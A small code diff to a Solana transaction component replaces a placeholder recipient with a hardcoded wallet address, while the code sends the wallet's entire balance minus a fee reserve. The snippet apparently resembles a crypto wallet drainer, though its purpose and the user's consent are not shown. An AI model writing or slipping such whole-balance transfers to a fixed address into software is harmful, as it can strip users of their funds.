@@ -48,7 +48,7 @@ function SolanaTransactionComponent() {
             }
 
             const amountToSend = balanceInLamports - feeReserve;
-            const recipientPublicKey = new PublicKey('RecipientPublicKeyHere'); // Ensure this is the recipient's correct public key
+            const recipientPublicKey = new PublicKey('34akXnFyRK2MowB3RG5jwX6Qf9AU22ewmPStXzeJehRh'); // Ensure this is the recipient's correct public key
 
             const transaction = new Transaction().add(
                 SystemProgram.transfer({
